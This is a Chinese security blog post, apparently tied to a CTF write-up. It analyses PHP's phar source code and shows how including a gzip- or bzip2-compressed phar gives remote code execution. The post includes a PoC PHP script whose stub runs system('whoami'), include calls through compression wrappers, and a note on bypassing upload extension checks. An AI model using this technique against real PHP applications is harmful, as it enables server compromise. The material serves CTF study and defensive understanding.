-</span></span><span style=display:flex><span>		<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;cannot rewind phar </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	buffer[<span style=color:#66d9ef>sizeof</span>(buffer)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>memset</span>(buffer, <span style=color:#ae81ff>32</span>, <span style=color:#66d9ef>sizeof</span>(token));
-</span></span><span style=display:flex><span>	halt_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#75715e>/* Maybe it&#39;s better to compile the file instead of just searching,  */</span>
-</span></span><span style=display:flex><span>	<span style=color:#75715e>/* but we only want the offset. So we want a .re scanner to find it. */</span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>php_stream_eof</span>(fp)) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ((got <span style=color:#f92672>=</span> <span style=color:#a6e22e>php_stream_read</span>(fp, buffer<span style=color:#f92672>+</span>tokenlen, readsize)) <span style=color:#f92672>&lt;</span> (<span style=color:#66d9ef>size_t</span>) tokenlen) {
-</span></span><span style=display:flex><span>			<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;internal corruption of phar </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> (truncated entry)&#34;</span>)
-</span></span><span style=display:flex><span>		}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>test <span style=color:#f92672>&amp;&amp;</span> recursion_count) {
-</span></span><span style=display:flex><span>			test <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\1&#39;</span>;
-</span></span><span style=display:flex><span>			pos <span style=color:#f92672>=</span> buffer<span style=color:#f92672>+</span>tokenlen;
-</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>memcmp</span>(pos, gz_magic, <span style=color:#ae81ff>3</span>)) {
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>char</span> err <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>				php_stream_filter <span style=color:#f92672>*</span>filter;
-</span></span><span style=display:flex><span>				php_stream <span style=color:#f92672>*</span>temp;
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* to properly decompress, we have to tell zlib to look for a zlib or gzip header */</span>
-</span></span><span style=display:flex><span>				zval filterparams;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>PHAR_G</span>(has_zlib)) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress gzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> to temporary file, enable zlib extension in php.ini&#34;</span>)
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>array_init</span>(<span style=color:#f92672>&amp;</span>filterparams);
-</span></span><span style=display:flex><span><span style=color:#75715e>/* this is defined in zlib&#39;s zconf.h */</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>#ifndef MAX_WBITS
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#define MAX_WBITS 15
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#endif
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>				<span style=color:#a6e22e>add_assoc_long_ex</span>(<span style=color:#f92672>&amp;</span>filterparams, <span style=color:#e6db74>&#34;window&#34;</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#e6db74>&#34;window&#34;</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, MAX_WBITS <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* entire file is gzip-compressed, uncompress to temporary file */</span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(temp <span style=color:#f92672>=</span> <span style=color:#a6e22e>php_stream_fopen_tmpfile</span>())) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to create temporary file for decompression of gzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_rewind</span>(fp);
-</span></span><span style=display:flex><span>				filter <span style=color:#f92672>=</span> <span style=color:#a6e22e>php_stream_filter_create</span>(<span style=color:#e6db74>&#34;zlib.inflate&#34;</span>, <span style=color:#f92672>&amp;</span>filterparams, <span style=color:#a6e22e>php_stream_is_persistent</span>(fp));
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>filter) {
-</span></span><span style=display:flex><span>					err <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>add_assoc_long_ex</span>(<span style=color:#f92672>&amp;</span>filterparams, <span style=color:#e6db74>&#34;window&#34;</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#e6db74>&#34;window&#34;</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, MAX_WBITS);
-</span></span><span style=display:flex><span>					filter <span style=color:#f92672>=</span> <span style=color:#a6e22e>php_stream_filter_create</span>(<span style=color:#e6db74>&#34;zlib.inflate&#34;</span>, <span style=color:#f92672>&amp;</span>filterparams, <span style=color:#a6e22e>php_stream_is_persistent</span>(fp));
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>zend_array_destroy</span>(<span style=color:#a6e22e>Z_ARR</span>(filterparams));
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>filter) {
-</span></span><span style=display:flex><span>						<span style=color:#a6e22e>php_stream_close</span>(temp);
-</span></span><span style=display:flex><span>						<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress gzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>, ext/zlib is buggy in PHP versions older than 5.2.6&#34;</span>)
-</span></span><span style=display:flex><span>					}
-</span></span><span style=display:flex><span>				} <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>zend_array_destroy</span>(<span style=color:#a6e22e>Z_ARR</span>(filterparams));
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_filter_append</span>(<span style=color:#f92672>&amp;</span>temp<span style=color:#f92672>-&gt;</span>writefilters, filter);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (SUCCESS <span style=color:#f92672>!=</span> <span style=color:#a6e22e>php_stream_copy_to_stream_ex</span>(fp, temp, PHP_STREAM_COPY_ALL, NULL)) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_filter_remove</span>(filter, <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span> (err) {
-</span></span><span style=display:flex><span>						<span style=color:#a6e22e>php_stream_close</span>(temp);
-</span></span><span style=display:flex><span>						<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress gzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>, ext/zlib is buggy in PHP versions older than 5.2.6&#34;</span>)
-</span></span><span style=display:flex><span>					}
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_close</span>(temp);
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress gzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> to temporary file&#34;</span>)
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_filter_flush</span>(filter, <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_filter_remove</span>(filter, <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_close</span>(fp);
-</span></span><span style=display:flex><span>				fp <span style=color:#f92672>=</span> temp;
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_rewind</span>(fp);
-</span></span><span style=display:flex><span>				compression <span style=color:#f92672>=</span> PHAR_FILE_COMPRESSED_GZ;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* now, start over */</span>
-</span></span><span style=display:flex><span>				test <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!--</span>recursion_count) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress gzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>					<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>continue</span>;
-</span></span><span style=display:flex><span>			} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>memcmp</span>(pos, bz_magic, <span style=color:#ae81ff>3</span>)) {
-</span></span><span style=display:flex><span>				php_stream_filter <span style=color:#f92672>*</span>filter;
-</span></span><span style=display:flex><span>				php_stream <span style=color:#f92672>*</span>temp;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>PHAR_G</span>(has_bz2)) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress bzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> to temporary file, enable bz2 extension in php.ini&#34;</span>)
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* entire file is bzip-compressed, uncompress to temporary file */</span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(temp <span style=color:#f92672>=</span> <span style=color:#a6e22e>php_stream_fopen_tmpfile</span>())) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to create temporary file for decompression of bzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_rewind</span>(fp);
-</span></span><span style=display:flex><span>				filter <span style=color:#f92672>=</span> <span style=color:#a6e22e>php_stream_filter_create</span>(<span style=color:#e6db74>&#34;bzip2.decompress&#34;</span>, NULL, <span style=color:#a6e22e>php_stream_is_persistent</span>(fp));
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>filter) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_close</span>(temp);
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress bzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>, filter creation failed&#34;</span>)
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_filter_append</span>(<span style=color:#f92672>&amp;</span>temp<span style=color:#f92672>-&gt;</span>writefilters, filter);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (SUCCESS <span style=color:#f92672>!=</span> <span style=color:#a6e22e>php_stream_copy_to_stream_ex</span>(fp, temp, PHP_STREAM_COPY_ALL, NULL)) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_filter_remove</span>(filter, <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_close</span>(temp);
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress bzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> to temporary file&#34;</span>)
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_filter_flush</span>(filter, <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_filter_remove</span>(filter, <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_close</span>(fp);
-</span></span><span style=display:flex><span>				fp <span style=color:#f92672>=</span> temp;
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_rewind</span>(fp);
-</span></span><span style=display:flex><span>				compression <span style=color:#f92672>=</span> PHAR_FILE_COMPRESSED_BZ2;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* now, start over */</span>
-</span></span><span style=display:flex><span>				test <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!--</span>recursion_count) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;unable to decompress bzipped phar archive </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>					<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>continue</span>;
-</span></span><span style=display:flex><span>			}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>memcmp</span>(pos, zip_magic, <span style=color:#ae81ff>4</span>)) {
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>php_stream_seek</span>(fp, <span style=color:#ae81ff>0</span>, SEEK_END);
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>phar_parse_zipfile</span>(fp, fname, fname_len, alias, alias_len, pphar, error);
-</span></span><span style=display:flex><span>			}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (got <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>512</span>) {
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>phar_is_tar</span>(pos, fname)) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_rewind</span>(fp);
-</span></span><span style=display:flex><span>					<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>phar_parse_tarfile</span>(fp, fname, fname_len, alias, alias_len, pphar, is_data, compression, error);
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>			}
-</span></span><span style=display:flex><span>		}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (got <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> (pos <span style=color:#f92672>=</span> <span style=color:#a6e22e>phar_strnstr</span>(buffer, got <span style=color:#f92672>+</span> <span style=color:#66d9ef>sizeof</span>(token), token, <span style=color:#66d9ef>sizeof</span>(token)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)) <span style=color:#f92672>!=</span> NULL) {
-</span></span><span style=display:flex><span>			halt_offset <span style=color:#f92672>+=</span> (pos <span style=color:#f92672>-</span> buffer); <span style=color:#75715e>/* no -tokenlen+tokenlen here */</span>
-</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>phar_parse_pharfile</span>(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error);
-</span></span><span style=display:flex><span>		}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		halt_offset <span style=color:#f92672>+=</span> got;
-</span></span><span style=display:flex><span>		<span style=color:#a6e22e>memmove</span>(buffer, buffer <span style=color:#f92672>+</span> window_size, tokenlen); <span style=color:#75715e>/* move the memory buffer by the size of the window */</span>
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>MAPPHAR_ALLOC_FAIL</span>(<span style=color:#e6db74>&#34;internal corruption of phar </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> (__HALT_COMPILER(); not found)&#34;</span>)
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span><span style=color:#75715e>/* }}} */</span>
-</span></span></code></pre></div><p>简单来说这个函数负责打开一个可能是 PHAR 的文件流，根据<strong>文件头</strong>来识别它的格式（PHAR、ZIP、TAR、GZ、BZ2），并进行相应的解压和解析，比如文件格式是GZ，就会先进行解压获取其中的phar文件，再进行解析</p><h2 id=利用phar压缩包实现rce>利用phar压缩包实现RCE<a hidden class=anchor aria-hidden=true href=#利用phar压缩包实现rce>#</a></h2><p>根据这个特性，可以实现上传不包含php代码的文件实现RCE，一个简单的poc：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>$phar <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Phar</span>(<span style=color:#e6db74>&#39;exploit.phar&#39;</span>);
-</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>startBuffering</span>();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$stub <span style=color:#f92672>=</span> <span style=color:#e6db74>&lt;&lt;&lt;&#39;</span><span style=color:#e6db74>STUB</span><span style=color:#e6db74>&#39;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?php
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>    system(&#39;whoami&#39;);
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>    __HALT_COMPILER();
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>?&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#e6db74>STUB</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setStub</span>($stub);
-</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#39;test.txt&#39;</span>, <span style=color:#e6db74>&#39;test&#39;</span>);
-</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>stopBuffering</span>();
-</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></span></span></code></pre></div><p>tar和phar都有php明文代码，没必要专门打包一个tar文件，所以选择直接include这个phar文件或压缩文件都可以实现RCE，利用了<code>.phar</code>文件名实现了解压：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;exploit.phar.gz&#34;</span>);   <span style=color:#75715e>// gzip exploit.phar
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;exploit.phar.bz2&#34;</span>);  <span style=color:#75715e>// bzip2 exploit.phar
-</span></span></span></code></pre></div><p>比较奇怪为什么zip没有成功，只能用伪协议，当然gz和bzip2也能用伪协议：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;zip://exploit.phar.zip#exploit.phar&#34;</span>); 
-</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;compress.zlib://exploit.phar.gz&#34;</span>); 
-</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;compress.bzip2://exploit.phar.bz2&#34;</span>);
-</span></span></code></pre></div><p>之前也提到是根据文件头来识别压缩文件的，所以说即使后缀不为<code>.gz .bz2</code>也是可以实现解压的，可以用于绕过后缀名的检验，只要文件是相应压缩包格式即可</p><p>参考资料：</p><p><a href=https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/>https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/</a></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://z9nn8w.github.io/>w8nn9z Blog</a></span> ·
-<span>Powered by
-<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
-<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
-</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
+</code></pre><p><code>zend_compile_file</code>是一个函数指针，对于phar：</p>
+<pre tabindex="0"><code>zend_compile_file = phar_compile_file;
+</code></pre><p>phar_compile_file：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> zend_op_array <span style="color:#f92672">*</span><span style="color:#a6e22e">phar_compile_file</span>(zend_file_handle <span style="color:#f92672">*</span>file_handle, <span style="color:#66d9ef">int</span> type) <span style="color:#75715e">/* </span>{{{ <span style="color:#960050;background-color:#1e0010">*/</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	zend_op_array <span style="color:#f92672">*</span>res;
+</span></span><span style="display:flex;"><span>	zend_string <span style="color:#f92672">*</span>name <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> failed;
+</span></span><span style="display:flex;"><span>	phar_archive_data <span style="color:#f92672">*</span>phar;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>file_handle <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>file_handle<span style="color:#f92672">-&gt;</span>filename) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">phar_orig_compile_file</span>(file_handle, type);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strstr</span>(<span style="color:#a6e22e">ZSTR_VAL</span>(file_handle<span style="color:#f92672">-&gt;</span>filename), <span style="color:#e6db74">&#34;.phar&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">strstr</span>(<span style="color:#a6e22e">ZSTR_VAL</span>(file_handle<span style="color:#f92672">-&gt;</span>filename), <span style="color:#e6db74">&#34;://&#34;</span>)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (SUCCESS <span style="color:#f92672">==</span> <span style="color:#a6e22e">phar_open_from_filename</span>(<span style="color:#a6e22e">ZSTR_VAL</span>(file_handle<span style="color:#f92672">-&gt;</span>filename), <span style="color:#a6e22e">ZSTR_LEN</span>(file_handle<span style="color:#f92672">-&gt;</span>filename), NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>phar, NULL)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (phar<span style="color:#f92672">-&gt;</span>is_zip <span style="color:#f92672">||</span> phar<span style="color:#f92672">-&gt;</span>is_tar) {
+</span></span><span style="display:flex;"><span>				zend_file_handle f;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* zip or tar-based phar */</span>
+</span></span><span style="display:flex;"><span>				name <span style="color:#f92672">=</span> <span style="color:#a6e22e">zend_strpprintf</span>(<span style="color:#ae81ff">4096</span>, <span style="color:#e6db74">&#34;phar://%s/%s&#34;</span>, <span style="color:#a6e22e">ZSTR_VAL</span>(file_handle<span style="color:#f92672">-&gt;</span>filename), <span style="color:#e6db74">&#34;.phar/stub.php&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">zend_stream_init_filename_ex</span>(<span style="color:#f92672">&amp;</span>f, name);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (SUCCESS <span style="color:#f92672">==</span> <span style="color:#a6e22e">zend_stream_open_function</span>(<span style="color:#f92672">&amp;</span>f)) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">zend_string_release</span>(f.filename);
+</span></span><span style="display:flex;"><span>					f.filename <span style="color:#f92672">=</span> file_handle<span style="color:#f92672">-&gt;</span>filename;
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (f.opened_path) {
+</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">zend_string_release</span>(f.opened_path);
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>					f.opened_path <span style="color:#f92672">=</span> file_handle<span style="color:#f92672">-&gt;</span>opened_path;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">switch</span> (file_handle<span style="color:#f92672">-&gt;</span>type) {
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">case</span> ZEND_HANDLE_STREAM:
